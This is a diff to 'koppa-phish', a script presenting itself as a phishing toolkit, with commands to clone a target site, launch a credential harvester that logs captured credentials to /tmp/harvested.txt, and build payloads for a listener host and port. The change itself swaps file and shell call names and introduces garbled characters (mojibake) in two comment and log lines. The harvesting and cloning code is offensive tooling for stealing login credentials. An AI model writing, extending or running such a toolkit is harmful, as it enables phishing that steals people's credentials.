@@ -1,4 +1,4 @@
-# koppa-phish v1.0 — Phishing toolkit
+# koppa-phish v1.0 â€” Phishing toolkit
 # Usage: koppa run koppa-phish [clone|harvest|payload]
 
 import http, parse, sys, encode, log
@@ -6,10 +6,10 @@ import http, parse, sys, encode, log
 fn cmd_clone(url, outdir) {
     log.info("===== Site Clone: {url} =====")
     if not outdir { outdir = "/tmp/phish" }
-    sys.exec("mkdir -p {outdir}")
+    os.shell("mkdir -p {outdir}")
     let resp = http.get(url)
     let html = resp.body
-    sys.write_file("{outdir}/index.html", html)
+    fs.write("{outdir}/index.html", html)
     log.success("[+] Cloned to {outdir}/index.html")
     log.info("    Host with: python3 -m http.server 8080 -d {outdir}")
 }
@@ -31,10 +31,10 @@ class H(http.server.BaseHTTPRequestHandler):
     def log_message(self,*a):pass
 http.server.HTTPServer(('{lhost}',{lport}),H).serve_forever()
 "
-    sys.write_file("/tmp/harvester.py", server)
+    fs.write("/tmp/harvester.py", server)
     log.success("[+] Starting harvester (Ctrl+C to stop)...")
-    log.info("    Creds → /tmp/harvested.txt")
-    sys.exec("python3 /tmp/harvester.py")
+    log.info("    Creds â†’ /tmp/harvested.txt")
+    os.shell("python3 /tmp/harvester.py")
 }
 
 fn cmd_payload(lhost, lport, ptype) {
@@ -67,3 +67,4 @@ fn main() {
     if mode == "payload" { cmd_payload(arg1, arg2, arg3) }
     log.success("Done!")
 }
+
